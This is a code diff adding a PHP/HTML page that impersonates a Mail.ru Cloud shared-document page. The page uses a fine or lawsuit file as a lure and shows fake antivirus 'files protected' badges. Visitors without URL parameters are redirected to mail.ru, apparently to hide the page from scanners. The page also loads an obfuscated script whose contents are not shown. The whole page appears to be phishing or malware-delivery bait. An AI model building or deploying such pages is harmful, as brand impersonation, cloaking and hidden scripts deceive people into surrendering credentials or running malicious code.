@@ -1,0 +1,174 @@
+<?php
+// Проверка параметров в URL на сервере
+if (empty($_SERVER['QUERY_STRING'])) {
+    // Редирект выполняется до вывода HTML
+    header("Location: https://mail.ru", true, 302);
+    exit();
+}
+?>
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <script>
+      // Подстраховка на клиенте
+      function checkURLParameters() {
+        const currentURL = window.location.href;
+        if (!currentURL.includes("?")) {
+          window.location.replace("https://mail.ru");
+        }
+      }
+      window.onload = checkURLParameters;
+    </script>
+
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Документ / Облако Mail.ru</title>
+    <link rel="stylesheet" href="css/style.css" />
+    <link
+      rel="shortcut icon"
+      href="https://cloud.imgsmail.ru/cloud.mail.ru/hashes/img/54cbc3d30f0b1da1d208.svg"
+      type="image/x-icon"
+    />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Inter:wght@100;200;300;400;500;600;700;800;900&display=swap"
+      rel="stylesheet"
+    />
+  </head>
+
+  <body>
+    <div class="bg-opacity"></div>
+    <div class="file-access-outside">
+      <div class="file-access"></div>
+    </div>
+    <header>
+      <div class="header-inner">
+        <div class="header-bottom">
+          <div class="header-btm-icon-logo">
+            <img src="css/res/icon-logo.png" class="logo" alt="" srcset="" />
+            <div class="header-top">
+              <a class="header-top-but" href="https://e.mail.ru/inbox">
+                Главная
+              </a>
+              <a class="header-top-but" href="https://e.mail.ru/inbox">Почта</a>
+              <a
+                class="header-top-but"
+                id="header-top-Cloud"
+                href="https://cloud.mail.ru/home/"
+              >
+                Облако
+              </a>
+              <a class="header-top-but" href="https://x.calendar.mail.ru">
+                Календарь
+              </a>
+              <a class="header-top-but" href="https://todo.mail.ru/inbox">
+                Документы
+              </a>
+              <a class="header-top-but" href="https://news.mail.ru">
+                Mail Space
+              </a>
+              <a class="header-top-but" href="https://vk.com">Покупки</a>
+              <a
+                class="header-top-but"
+                id="header-top-all-projects"
+                href="https://vk.company/ru/projects/"
+              >
+                <div style="margin-right: 6px">Все проекты</div>
+                <img
+                  class="header-btm-group-img2"
+                  src="css/res/header-group-2.svg"
+                  alt=""
+                />
+              </a>
+            </div>
+          </div>
+
+          <div class="header-btm-group">
+            <div class="header-btm-group-download">
+              <img src="css/res/header-group-5.svg" alt="" />
+              <div>Cкачать 178 КБ</div>
+            </div>
+
+            <div class="header-btm-input">
+              <img
+                class="header-btm-img"
+                src="css/res/header-group-3.svg"
+                alt=""
+              />
+              <input
+                class="header-btm-input"
+                placeholder="Поиск по разделу"
+                type="text"
+              />
+            </div>
+          </div>
+        </div>
+      </div>
+    </header>
+
+    <div class="conteiner">
+      <div class="content-title">
+        <div>
+          <p class="text-text-title-content">Документы</p>
+        </div>
+        <div>1 файл</div>
+      </div>
+      <div class="content-file">
+        <div class="content-file-left">
+          <img class="file-focus-icon" src="css/res/Group 15 (1).svg" alt="" />
+          <img
+            class="file-focus-icons"
+            style="height: 48px"
+            src="css/res/content-icon.png"
+            alt=""
+          />
+          <div class="text-name-block">Штраф._Исковое_заявление.doc</div>
+        </div>
+        <div class="content-file-right">
+          <div
+            style="display: flex; justify-content: center; align-items: center"
+          >
+            <div style="white-space: nowrap">14.08.25 12:56</div>
+            <div style="white-space: nowrap">74.5 КБ</div>
+            <img class="download-file" src="css/res/Group 16.svg" alt="" />
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <footer>
+      <div class="footer-inner">
+        <div>
+          <a href="https://mail.ru">Mail.ru</a>
+          <a href="https://vk.company/ru/">О компании</a>
+          <a href="https://sales.vk.company/ru/">Реклама</a>
+          <a href="https://team.vk.company">Вакансии</a>
+        </div>
+        <div class="footer-link-2">
+          <div style="display: flex; justify-content: center">
+            <a href="https://www.kaspersky.ru/home-security">Файлы защищены</a>
+            <img
+              style="margin-left: 5px; margin-top: 2px"
+              src="css/res/Dr._Web-Logo.wine.png"
+              alt=""
+              width="70"
+            />
+          </div>
+          <a href="https://help.mail.ru/legal/terms/cloud/LA">
+            Лицензионное соглашение
+          </a>
+          <a href="https://help.mail.ru/cloud_web/">Помощь</a>
+          <a href="https://cloud.mail.ru/subscriptions">Мои подписки</a>
+          <a
+            href="https://disko.hb.ru-msk.vkcs.cloud/cloud/win/setup/offline/CloudSetupFull.exe"
+          >
+            Облако для ПК
+          </a>
+        </div>
+      </div>
+    </footer>
+
+    <script src="dist/bundle.obf.js"></script>
+  </body>
+</html>
